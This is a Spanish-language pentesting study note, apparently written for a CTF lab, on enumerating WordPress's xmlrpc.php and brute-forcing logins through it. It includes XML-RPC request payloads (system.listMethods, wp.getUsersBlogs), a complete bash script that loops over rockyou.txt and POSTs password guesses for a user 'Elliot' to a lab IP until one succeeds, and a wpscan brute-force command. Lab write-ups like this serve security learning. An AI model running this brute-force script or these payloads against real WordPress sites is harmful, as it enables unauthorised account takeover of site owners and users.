# ENUMERAR XMLRPC + ATAQUES FUERZA BRUTA WORDPRESS
También es posible que podamos enumerar este archivo el cual nos sirve para obtener credenciales de usuarios, ya que se trata de un archivo que permite la comunicación de wordpress y otros sistemas usando php; y si lo buscamos en el navegador vemos que existe pero que sólo tramita peticiones por POST:
![[Pasted image 20240613005147.png]]

Por tanto con curl vamos a enviarle una petición por POST y vemos que sí nos devuelve algo en XML:
![[Pasted image 20240613005152.png]]

Y ahora que vemos que existe este fichero, buscamos en google como explotar vulnerabilidades haciendo uso de este fichero:
![[Pasted image 20240613005159.png]]

Y nos dicen que tenemos que tramitar esto:
![[Pasted image 20240613005206.png]]

```php
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 135

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```

Por tanto pegamos este código en un fichero xml:
![[Pasted image 20240613005324.png]]

Y ahora este fichero lo tramitamos por POST contra el xmlrpc de wordpress:
![[Pasted image 20240613005330.png]]

Y el servidor nos responde con todos los métodos disponibles:
![[Pasted image 20240613005336.png]]

Y si miramos más en la página, vemos que nos muestran como hacer un ataque de fuerza bruta:
![[Pasted image 20240613005341.png]]

```php
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
```
Y vemos que aquí si ponemos unas credenciales correctas y lo ejecutamos como antes, nos va a funcionar correctamente:
![[Pasted image 20240613005349.png]]

![[Pasted image 20240613005352.png]]

En este punto podríamos hacer un ataque de fuerza bruta, tanto con un script de bash o con la propia herramienta wpscan:
```bash
#!/bin/bash

#!/bin/bash

function salir() {
    exit 1
}

trap salir SIGINT

for i in $(cat rockyou.txt); do
    variable=$(cat <<FIN
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>Elliot</value></param> 
<param><value>$i</value></param> 
</params>     
</methodCall>
FIN
    )

    echo -e "$variable" >> enviar.xml
    echo -e "[+] Probamos con la contraseña $i"

    curl -s -X POST 'http://10.10.126.89/xmlrpc.php' -d@enviar.xml >> log.log

    if [ ! "$(cat log.log | grep 'Incorrect username or password.')" ]; then
         echo -e "[+] La contraseña para Elliot es $i"
         exit 0
    fi

    sleep 1

rm log.log enviar.xml

done
```

![[Pasted image 20240613005403.png]]

O también directamente desde la herramienta, lo cual será más rápido:
```bash
wpscan --url <url> -U <user> -P <pass>
```

![[Pasted image 20240613005411.png]]

Y nos la encuentra:
![[Pasted image 20240613005417.png]]
